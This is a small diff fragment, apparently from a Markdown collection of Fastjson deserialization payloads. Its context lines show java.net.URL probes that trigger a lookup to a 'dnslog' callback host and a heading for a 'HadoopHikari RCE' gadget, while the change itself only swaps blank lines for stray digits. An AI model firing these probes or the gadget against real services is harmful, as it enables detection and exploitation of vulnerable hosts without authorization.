@@ -12,8 +12,8 @@ Set[{"@type":"java.net.URL","val":"dnslog"}]
 Set[{"@type":"java.net.URL","val":"dnslog"}
 {{"@type":"java.net.URL","val":"dnslog"}:0
 ```
-
-
+11
+1
 
 ## HadoopHikari RCE（<= 1.2.68）
 
